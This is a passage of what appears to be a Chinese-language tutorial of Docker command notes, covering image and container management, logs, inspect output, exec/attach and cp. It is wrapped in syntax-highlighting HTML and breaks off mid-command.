class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br></pre></td><td class="code"><pre><code class="hljs bash">帮助文档<br><br>docker version     <span class="hljs-comment">#显示docker版本</span><br>docker info   <span class="hljs-comment">#显示docker的系统信息，包括镜像和容器的数量</span><br>docker 命令 --<span class="hljs-built_in">help</span>  <span class="hljs-comment">#帮助命令</span><br>镜像命令<br><br>docker images 查看所有本地的主机上的镜像<br><br>[root@kai kai]<span class="hljs-comment"># docker images</span><br>REPOSITORY                     TAG                 IMAGE ID            CREATED                 SIZE<br>docker.io/c0ny1/upload-labs    latest              aa4fdd1dd211        3 years a    go         472 MB<br>docker.io/acgpiano/sqli-labs   latest              0976afc45249        6 years a    go         434 MB<br><span class="hljs-comment"># REPOSITORY 镜像的仓库源，TAG镜像的标签 </span><br> -a, --all              Show all images (default hides intermediate images)<br> -q, --quiet            Only show numeric IDs<span class="hljs-comment">#只显示id</span><br>docker search 搜索镜像<br><br>[root@kai kai]<span class="hljs-comment"># docker search mysql</span><br>INDEX       NAME                                        DESCRIPTION                                     STARS     OFFICIAL   AUTOMATED<br>docker.io   docker.io/mysql                             MySQL is a widely used, open-source relati...   12103     [OK]<br>docker.io   docker.io/mariadb                           MariaDB Server is a high performing open s...   4636      [OK]<br>docker.io   docker.io/mysql/mysql-server                Optimized MySQL Server Docker images. Crea...   905                  [OK]<br>docker.io   docker.io/centos/mysql-57-centos7           MySQL 5.7 SQL database serve<br><br>--filter=STARS=3000  可选项，过滤搜索<br>docker pull 镜像名[:tags]  ---&gt;下载镜像  tags:选版本，默认latest<br>docker 使用分层下载，若下载同类其他版本，不同版本的相同层次文件不会重复下载，可以共用<br><br>docker rmi 镜像名 删除镜像<br><br>docker rmi -f 镜像id ---&gt;删除指定容器<br>docker rmi -f 镜像id 镜像id 镜像id---&gt;删除多个容器<br>docker rmi -f $(docker images -aq)  ---&gt;linux命令批量删除所有镜像<br><br>容器命令<br><br>有了镜像才可以创建容器，linux,下载一个centos<br><br>docker pull centos<br>新建容器并启动<br><br>docker run [可选参数] image<br><span class="hljs-comment">#参数说明</span><br>--name=<span class="hljs-string">&quot;Name&quot;</span>  --&gt;容器名字 tomcat1 tomcat2 用来区分容器<br>-d             --&gt;后台运行方式<br>-it            --&gt;使用交互方式运行，进入容器查看内容<br>-p <br>-p 主机端口: 容器端口<br>-p 容器端口<br>-P             --&gt;随即指定端口<br><span class="hljs-comment">#测试，启动并进入容器</span><br>[root@kai kai]<span class="hljs-comment"># docker run -it centos /bin/bash</span><br>[root@64b9ef6846ef /]<span class="hljs-comment"># ls    #查看容器内的centos，基础版本，很多命令不完善</span><br>bin  etc   lib    lost+found  mnt  proc  run   srv  tmp  var<br>dev  home  lib64  media       opt  root  sbin  sys  usr<br><br><span class="hljs-built_in">exit</span>  <span class="hljs-comment">#退出centos容器，容器停止并退出</span><br><br>Ctrl + p +q <span class="hljs-comment">#容器不停止退出 </span><br><br><br>列出所有的运行的容器<br><br>docker ps<br>     <span class="hljs-comment">#列出当前正在运行的容器</span><br>-a   <span class="hljs-comment">#列出当前正在运行的容器+带出历史运行的容器</span><br>-n=? <span class="hljs-comment">#显示最近创建的容器</span><br>-q   <span class="hljs-comment">#只显示的编号</span><br>[root@kai kai]<span class="hljs-comment"># docker ps</span><br>CONTAINER ID        IMAGE               COMMAND             CREATED             STATUS              PORTS               NAMES<br>[root@kai kai]<span class="hljs-comment"># docker ps -a</span><br>CONTAINER ID        IMAGE               COMMAND             CREATED             STATUS                        PORTS               NAMES<br>64b9ef6846ef        centos              <span class="hljs-string">&quot;/bin/bash&quot;</span>         2 minutes ago       Exited (130) 27 seconds ago                       jovial_curran<br><br>删除容器<br><br>docker rm 容器id           <span class="hljs-comment">#删除指定容器，不能删除正在运行的容器，若强制，则rm -f</span><br>docker rm -f $(docker ps -aq)  <span class="hljs-comment">#删除所有容器</span><br>docker ps -a -q|xargs docker rm <span class="hljs-comment">#删除所有的容器</span><br>启动和停止容器的操作<br><br>docker start 容器id    <span class="hljs-comment">#启动容器</span><br>docker restart 容器id  <span class="hljs-comment">#重启容器</span><br>docker stop 容器id     <span class="hljs-comment">#停止当前正在运行的容器</span><br>docker <span class="hljs-built_in">kill</span> 容器id     <span class="hljs-comment">#强制停止当前容器</span><br>后台启动<br><br>docker run -d 镜像名<br><br>docker run -d centos<br><span class="hljs-comment">#docker ps 发现centos停止了</span><br><span class="hljs-comment">#坑，docker容器使用后台运行，那必须要有一个前台进程，docker发现没有应用，就会自动停止</span><br><span class="hljs-comment">#nginx，容器启动后，发现自己没有提供应用服务，就会自动停止了，就是没有程序了</span><br>日志<br><br>docker logs --<span class="hljs-built_in">help</span>   <br>      --details        Show extra details provided to logs<br>  -f, --follow         Follow <span class="hljs-built_in">log</span> output<br>      --<span class="hljs-built_in">help</span>           Print usage<br>      --since string   Show logs since timestamp<br>      --tail string    Number of lines to show from the end of the logs (default <span class="hljs-string">&quot;all&quot;</span>)<br>  -t, --timestamps     Show timestamps<br><br>docker logs -f -t --tail 容器<br><span class="hljs-comment">#显示日志</span><br>-tf<span class="hljs-comment">#显示日志</span><br>--tail number  <span class="hljs-comment">#要显示日志条数</span><br>[root@kai kai]<span class="hljs-comment"># docker logs -ft --tail 10 aa4fdd1dd211</span><br><br>查看容器中的进程信息<br><br>docker top 容器id<br>[root@kai kai]<span class="hljs-comment"># docker top b9c6c69111ea</span><br>UID                 PID                 PPID                C                   STIME               TTY                 TIME                CMD<br>root                9247                9231                0                   14:38               pts/0               00:00:00            /bin/bash<br><br><br>查看镜像元数据<br><br>docker inspect --<span class="hljs-built_in">help</span><br>  -f, --format string   Format the output using the given Go template<br>      --<span class="hljs-built_in">help</span>            Print usage<br>  -s, --size            Display total file sizes <span class="hljs-keyword">if</span> the <span class="hljs-built_in">type</span> is container<br>      --<span class="hljs-built_in">type</span> string     Return JSON <span class="hljs-keyword">for</span> specified <span class="hljs-built_in">type</span><br><br>docker inspect 容器id<br>[root@kai kai]<span class="hljs-comment"># docker inspect b9c6c69111ea</span><br>[<br>    &#123;<br>        <span class="hljs-string">&quot;Id&quot;</span>: <span class="hljs-string">&quot;b9c6c69111ea5d0ccbf51296cef17922ae4e71500905933a415896dd5cfbc81a&quot;</span>,<br>        <span class="hljs-string">&quot;Created&quot;</span>: <span class="hljs-string">&quot;2022-02-12T06:38:46.946062314Z&quot;</span>,<br>        <span class="hljs-string">&quot;Path&quot;</span>: <span class="hljs-string">&quot;/bin/bash&quot;</span>,<br>        <span class="hljs-string">&quot;Args&quot;</span>: [],<br>        <span class="hljs-string">&quot;State&quot;</span>: &#123;<br>            <span class="hljs-string">&quot;Status&quot;</span>: <span class="hljs-string">&quot;running&quot;</span>,<br>            <span class="hljs-string">&quot;Running&quot;</span>: <span class="hljs-literal">true</span>,<br>            <span class="hljs-string">&quot;Paused&quot;</span>: <span class="hljs-literal">false</span>,<br>            <span class="hljs-string">&quot;Restarting&quot;</span>: <span class="hljs-literal">false</span>,<br>            <span class="hljs-string">&quot;OOMKilled&quot;</span>: <span class="hljs-literal">false</span>,<br>            <span class="hljs-string">&quot;Dead&quot;</span>: <span class="hljs-literal">false</span>,<br>            <span class="hljs-string">&quot;Pid&quot;</span>: 9247,<br>            <span class="hljs-string">&quot;ExitCode&quot;</span>: 0,<br>            <span class="hljs-string">&quot;Error&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,<br>            <span class="hljs-string">&quot;StartedAt&quot;</span>: <span class="hljs-string">&quot;2022-02-12T06:38:47.157542668Z&quot;</span>,<br>            <span class="hljs-string">&quot;FinishedAt&quot;</span>: <span class="hljs-string">&quot;0001-01-01T00:00:00Z&quot;</span><br>        &#125;,<br>        <span class="hljs-string">&quot;Image&quot;</span>: <span class="hljs-string">&quot;sha256:5d0da3dc976460b72c77d94c8a1ad043720b0416bfc16c52c45d4847e53fadb6&quot;</span>,<br>        <span class="hljs-string">&quot;ResolvConfPath&quot;</span>: <span class="hljs-string">&quot;/var/lib/docker/containers/b9c6c69111ea5d0ccbf51296cef17922ae4e71500905933a415896dd5cfbc81a/resolv.conf&quot;</span>,<br>        <span class="hljs-string">&quot;HostnamePath&quot;</span>: <span class="hljs-string">&quot;/var/lib/docker/containers/b9c6c69111ea5d0ccbf51296cef17922ae4e71500905933a415896dd5cfbc81a/hostname&quot;</span>,<br>        <span class="hljs-string">&quot;HostsPath&quot;</span>: <span class="hljs-string">&quot;/var/lib/docker/containers/b9c6c69111ea5d0ccbf51296cef17922ae4e71500905933a415896dd5cfbc81a/hosts&quot;</span>,<br>        <span class="hljs-string">&quot;LogPath&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,<br>        <span class="hljs-string">&quot;Name&quot;</span>: <span class="hljs-string">&quot;/competent_murdock&quot;</span>,<br>        <span class="hljs-string">&quot;RestartCount&quot;</span>: 0,<br>        <span class="hljs-string">&quot;Driver&quot;</span>: <span class="hljs-string">&quot;overlay2&quot;</span>,<br>        <span class="hljs-string">&quot;MountLabel&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,<br>        <span class="hljs-string">&quot;ProcessLabel&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,<br>        <span class="hljs-string">&quot;AppArmorProfile&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,<br>        <span class="hljs-string">&quot;ExecIDs&quot;</span>: null,<br>        <span class="hljs-string">&quot;HostConfig&quot;</span>: &#123;<br>            <span class="hljs-string">&quot;Binds&quot;</span>: null,<br>            <span class="hljs-string">&quot;ContainerIDFile&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,<br>            <span class="hljs-string">&quot;LogConfig&quot;</span>: &#123;<br>                <span class="hljs-string">&quot;Type&quot;</span>: <span class="hljs-string">&quot;journald&quot;</span>,<br>                <span class="hljs-string">&quot;Config&quot;</span>: &#123;&#125;<br>            &#125;,<br>            <span class="hljs-string">&quot;NetworkMode&quot;</span>: <span class="hljs-string">&quot;default&quot;</span>,<br>            <span class="hljs-string">&quot;PortBindings&quot;</span>: &#123;&#125;,<br>            <span class="hljs-string">&quot;RestartPolicy&quot;</span>: &#123;<br>                <span class="hljs-string">&quot;Name&quot;</span>: <span class="hljs-string">&quot;no&quot;</span>,<br>                <span class="hljs-string">&quot;MaximumRetryCount&quot;</span>: 0<br>            &#125;,<br>            <span class="hljs-string">&quot;AutoRemove&quot;</span>: <span class="hljs-literal">false</span>,<br>            <span class="hljs-string">&quot;VolumeDriver&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,<br>            <span class="hljs-string">&quot;VolumesFrom&quot;</span>: null,<br>            <span class="hljs-string">&quot;CapAdd&quot;</span>: null,<br>            <span class="hljs-string">&quot;CapDrop&quot;</span>: null,<br>            <span class="hljs-string">&quot;Dns&quot;</span>: [],<br>            <span class="hljs-string">&quot;DnsOptions&quot;</span>: [],<br>            <span class="hljs-string">&quot;DnsSearch&quot;</span>: [],<br>            <span class="hljs-string">&quot;ExtraHosts&quot;</span>: null,<br>            <span class="hljs-string">&quot;GroupAdd&quot;</span>: null,<br>            <span class="hljs-string">&quot;IpcMode&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,<br>            <span class="hljs-string">&quot;Cgroup&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,<br>            <span class="hljs-string">&quot;Links&quot;</span>: null,<br>            <span class="hljs-string">&quot;OomScoreAdj&quot;</span>: 0,<br>            <span class="hljs-string">&quot;PidMode&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,<br>            <span class="hljs-string">&quot;Privileged&quot;</span>: <span class="hljs-literal">false</span>,<br>            <span class="hljs-string">&quot;PublishAllPorts&quot;</span>: <span class="hljs-literal">false</span>,<br>            <span class="hljs-string">&quot;ReadonlyRootfs&quot;</span>: <span class="hljs-literal">false</span>,<br>            <span class="hljs-string">&quot;SecurityOpt&quot;</span>: null,<br>            <span class="hljs-string">&quot;UTSMode&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,<br>            <span class="hljs-string">&quot;UsernsMode&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,<br>            <span class="hljs-string">&quot;ShmSize&quot;</span>: 67108864,<br>            <span class="hljs-string">&quot;Runtime&quot;</span>: <span class="hljs-string">&quot;docker-runc&quot;</span>,<br>            <span class="hljs-string">&quot;ConsoleSize&quot;</span>: [<br>                0,<br>                0<br>            ],<br>            <span class="hljs-string">&quot;Isolation&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,<br>            <span class="hljs-string">&quot;CpuShares&quot;</span>: 0,<br>            <span class="hljs-string">&quot;Memory&quot;</span>: 0,<br>            <span class="hljs-string">&quot;NanoCpus&quot;</span>: 0,<br>            <span class="hljs-string">&quot;CgroupParent&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,<br>            <span class="hljs-string">&quot;BlkioWeight&quot;</span>: 0,<br>            <span class="hljs-string">&quot;BlkioWeightDevice&quot;</span>: null,<br>            <span class="hljs-string">&quot;BlkioDeviceReadBps&quot;</span>: null,<br>            <span class="hljs-string">&quot;BlkioDeviceWriteBps&quot;</span>: null,<br>            <span class="hljs-string">&quot;BlkioDeviceReadIOps&quot;</span>: null,<br>            <span class="hljs-string">&quot;BlkioDeviceWriteIOps&quot;</span>: null,<br>            <span class="hljs-string">&quot;CpuPeriod&quot;</span>: 0,<br>            <span class="hljs-string">&quot;CpuQuota&quot;</span>: 0,<br>            <span class="hljs-string">&quot;CpuRealtimePeriod&quot;</span>: 0,<br>            <span class="hljs-string">&quot;CpuRealtimeRuntime&quot;</span>: 0,<br>            <span class="hljs-string">&quot;CpusetCpus&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,<br>            <span class="hljs-string">&quot;CpusetMems&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,<br>            <span class="hljs-string">&quot;Devices&quot;</span>: [],<br>            <span class="hljs-string">&quot;DiskQuota&quot;</span>: 0,<br>            <span class="hljs-string">&quot;KernelMemory&quot;</span>: 0,<br>            <span class="hljs-string">&quot;MemoryReservation&quot;</span>: 0,<br>            <span class="hljs-string">&quot;MemorySwap&quot;</span>: 0,<br>            <span class="hljs-string">&quot;MemorySwappiness&quot;</span>: -1,<br>            <span class="hljs-string">&quot;OomKillDisable&quot;</span>: <span class="hljs-literal">false</span>,<br>            <span class="hljs-string">&quot;PidsLimit&quot;</span>: 0,<br>            <span class="hljs-string">&quot;Ulimits&quot;</span>: null,<br>            <span class="hljs-string">&quot;CpuCount&quot;</span>: 0,<br>            <span class="hljs-string">&quot;CpuPercent&quot;</span>: 0,<br>            <span class="hljs-string">&quot;IOMaximumIOps&quot;</span>: 0,<br>            <span class="hljs-string">&quot;IOMaximumBandwidth&quot;</span>: 0<br>        &#125;,<br>        <span class="hljs-string">&quot;GraphDriver&quot;</span>: &#123;<br>            <span class="hljs-string">&quot;Name&quot;</span>: <span class="hljs-string">&quot;overlay2&quot;</span>,<br>            <span class="hljs-string">&quot;Data&quot;</span>: &#123;<br>                <span class="hljs-string">&quot;LowerDir&quot;</span>: <span class="hljs-string">&quot;/var/lib/docker/overlay2/2b3908fb1f57a7f268ee1fe90e8a9b82cc21d53bbe621119b451ed4d37baefb2-init/diff:/var/lib/docker/overlay2/c929098156597e7fde875733d39d592621785358a02b2476b4fb863e1318348a/diff&quot;</span>,<br>                <span class="hljs-string">&quot;MergedDir&quot;</span>: <span class="hljs-string">&quot;/var/lib/docker/overlay2/2b3908fb1f57a7f268ee1fe90e8a9b82cc21d53bbe621119b451ed4d37baefb2/merged&quot;</span>,<br>                <span class="hljs-string">&quot;UpperDir&quot;</span>: <span class="hljs-string">&quot;/var/lib/docker/overlay2/2b3908fb1f57a7f268ee1fe90e8a9b82cc21d53bbe621119b451ed4d37baefb2/diff&quot;</span>,<br>                <span class="hljs-string">&quot;WorkDir&quot;</span>: <span class="hljs-string">&quot;/var/lib/docker/overlay2/2b3908fb1f57a7f268ee1fe90e8a9b82cc21d53bbe621119b451ed4d37baefb2/work&quot;</span><br>            &#125;<br>        &#125;,<br>        <span class="hljs-string">&quot;Mounts&quot;</span>: [],<br>        <span class="hljs-string">&quot;Config&quot;</span>: &#123;<br>            <span class="hljs-string">&quot;Hostname&quot;</span>: <span class="hljs-string">&quot;b9c6c69111ea&quot;</span>,<br>            <span class="hljs-string">&quot;Domainname&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,<br>            <span class="hljs-string">&quot;User&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,<br>            <span class="hljs-string">&quot;AttachStdin&quot;</span>: <span class="hljs-literal">true</span>,<br>            <span class="hljs-string">&quot;AttachStdout&quot;</span>: <span class="hljs-literal">true</span>,<br>            <span class="hljs-string">&quot;AttachStderr&quot;</span>: <span class="hljs-literal">true</span>,<br>            <span class="hljs-string">&quot;Tty&quot;</span>: <span class="hljs-literal">true</span>,<br>            <span class="hljs-string">&quot;OpenStdin&quot;</span>: <span class="hljs-literal">true</span>,<br>            <span class="hljs-string">&quot;StdinOnce&quot;</span>: <span class="hljs-literal">true</span>,<br>            <span class="hljs-string">&quot;Env&quot;</span>: [<br>                <span class="hljs-string">&quot;PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin&quot;</span><br>            ],<br>            <span class="hljs-string">&quot;Cmd&quot;</span>: [<br>                <span class="hljs-string">&quot;/bin/bash&quot;</span><br>            ],<br>            <span class="hljs-string">&quot;Image&quot;</span>: <span class="hljs-string">&quot;centos&quot;</span>,<br>            <span class="hljs-string">&quot;Volumes&quot;</span>: null,<br>            <span class="hljs-string">&quot;WorkingDir&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,<br>            <span class="hljs-string">&quot;Entrypoint&quot;</span>: null,<br>            <span class="hljs-string">&quot;OnBuild&quot;</span>: null,<br>            <span class="hljs-string">&quot;Labels&quot;</span>: &#123;<br>                <span class="hljs-string">&quot;org.label-schema.build-date&quot;</span>: <span class="hljs-string">&quot;20210915&quot;</span>,<br>                <span class="hljs-string">&quot;org.label-schema.license&quot;</span>: <span class="hljs-string">&quot;GPLv2&quot;</span>,<br>                <span class="hljs-string">&quot;org.label-schema.name&quot;</span>: <span class="hljs-string">&quot;CentOS Base Image&quot;</span>,<br>                <span class="hljs-string">&quot;org.label-schema.schema-version&quot;</span>: <span class="hljs-string">&quot;1.0&quot;</span>,<br>                <span class="hljs-string">&quot;org.label-schema.vendor&quot;</span>: <span class="hljs-string">&quot;CentOS&quot;</span><br>            &#125;<br>        &#125;,<br>        <span class="hljs-string">&quot;NetworkSettings&quot;</span>: &#123;<br>            <span class="hljs-string">&quot;Bridge&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,<br>            <span class="hljs-string">&quot;SandboxID&quot;</span>: <span class="hljs-string">&quot;96c5a049392ff3080acd7c87435235324bedd58ce9d60d7ae40b7a575d0530fb&quot;</span>,<br>            <span class="hljs-string">&quot;HairpinMode&quot;</span>: <span class="hljs-literal">false</span>,<br>            <span class="hljs-string">&quot;LinkLocalIPv6Address&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,<br>            <span class="hljs-string">&quot;LinkLocalIPv6PrefixLen&quot;</span>: 0,<br>            <span class="hljs-string">&quot;Ports&quot;</span>: &#123;&#125;,<br>            <span class="hljs-string">&quot;SandboxKey&quot;</span>: <span class="hljs-string">&quot;/var/run/docker/netns/96c5a049392f&quot;</span>,<br>            <span class="hljs-string">&quot;SecondaryIPAddresses&quot;</span>: null,<br>            <span class="hljs-string">&quot;SecondaryIPv6Addresses&quot;</span>: null,<br>            <span class="hljs-string">&quot;EndpointID&quot;</span>: <span class="hljs-string">&quot;2713bfadd8c713125a5b3c8115158fa5c1f5d9134ad6400351fe72eedc22e500&quot;</span>,<br>            <span class="hljs-string">&quot;Gateway&quot;</span>: <span class="hljs-string">&quot;172.17.0.1&quot;</span>,<br>            <span class="hljs-string">&quot;GlobalIPv6Address&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,<br>            <span class="hljs-string">&quot;GlobalIPv6PrefixLen&quot;</span>: 0,<br>            <span class="hljs-string">&quot;IPAddress&quot;</span>: <span class="hljs-string">&quot;172.17.0.2&quot;</span>,<br>            <span class="hljs-string">&quot;IPPrefixLen&quot;</span>: 16,<br>            <span class="hljs-string">&quot;IPv6Gateway&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,<br>            <span class="hljs-string">&quot;MacAddress&quot;</span>: <span class="hljs-string">&quot;02:42:ac:11:00:02&quot;</span>,<br>            <span class="hljs-string">&quot;Networks&quot;</span>: &#123;<br>                <span class="hljs-string">&quot;bridge&quot;</span>: &#123;<br>                    <span class="hljs-string">&quot;IPAMConfig&quot;</span>: null,<br>                    <span class="hljs-string">&quot;Links&quot;</span>: null,<br>                    <span class="hljs-string">&quot;Aliases&quot;</span>: null,<br>                    <span class="hljs-string">&quot;NetworkID&quot;</span>: <span class="hljs-string">&quot;10a22f71f8cdb181a3acf67565fa30a3cadba845ee032ec0e167e8a1d603612b&quot;</span>,<br>                    <span class="hljs-string">&quot;EndpointID&quot;</span>: <span class="hljs-string">&quot;2713bfadd8c713125a5b3c8115158fa5c1f5d9134ad6400351fe72eedc22e500&quot;</span>,<br>                    <span class="hljs-string">&quot;Gateway&quot;</span>: <span class="hljs-string">&quot;172.17.0.1&quot;</span>,<br>                    <span class="hljs-string">&quot;IPAddress&quot;</span>: <span class="hljs-string">&quot;172.17.0.2&quot;</span>,<br>                    <span class="hljs-string">&quot;IPPrefixLen&quot;</span>: 16,<br>                    <span class="hljs-string">&quot;IPv6Gateway&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,<br>                    <span class="hljs-string">&quot;GlobalIPv6Address&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,<br>                    <span class="hljs-string">&quot;GlobalIPv6PrefixLen&quot;</span>: 0,<br>                    <span class="hljs-string">&quot;MacAddress&quot;</span>: <span class="hljs-string">&quot;02:42:ac:11:00:02&quot;</span><br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125;<br>]<br><br>进入当前正在运行的容器<br><span class="hljs-comment">#容器后台运行，需要进入容器，修改一些配置</span><br><br><span class="hljs-comment">#命令</span><br>docker <span class="hljs-built_in">exec</span> -it 容器id bashshell<br>-----&gt;进入容器后开启一个新的终端<br><br>docker attach 容器id<br>-----&gt;进入容器正在执行的终端，不会启动新的进程<br><br>从容器内拷贝文件到主机上<br><br>docker cp 容器id:/容器内路径 目的主机路径<br><br>[root@kai kai]<span class="hljs-comment"># docker run -it centos /bin/bash</span><br><br><span class="hljs-comment">#查看容器当前目录</span><br>[root@3ab96e4a355c /]<span class="hljs-comment"># ls</span><br>bin  etc   lib    lost+found  mnt  proc  run   srv  tmp  var<br>dev  home  lib64  media       opt  root  sbin  sys  usr<br>[root@3ab96e4a355c /]<span class="hljs-comment"># cd home</span><br>[root@3ab96e4a355c home]<span class="hljs-comment"># ls</span><br><br><span class="hljs-comment">#创建容器文件</span><br>[root@3ab96e4a355c home]<span class="hljs-comment"># touch 